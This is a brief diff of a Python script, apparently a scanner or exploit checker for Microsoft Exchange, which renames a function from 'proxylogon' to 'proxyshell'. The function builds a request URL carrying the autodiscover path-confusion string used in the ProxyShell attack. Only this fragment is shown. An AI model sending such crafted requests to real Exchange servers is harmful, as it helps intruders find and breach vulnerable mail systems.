@@ -5,7 +5,7 @@ import urllib3
 import requests,sys
 requests.packages.urllib3.disable_warnings()
 
-def proxylogon(url):
+def proxyshell(url):
     url = url.strip()
     url = url + "/autodiscover/autodiscover.json?@abc.com/owa/?&Email=autodiscover/autodiscover.json%3F@abc.com"
     try:
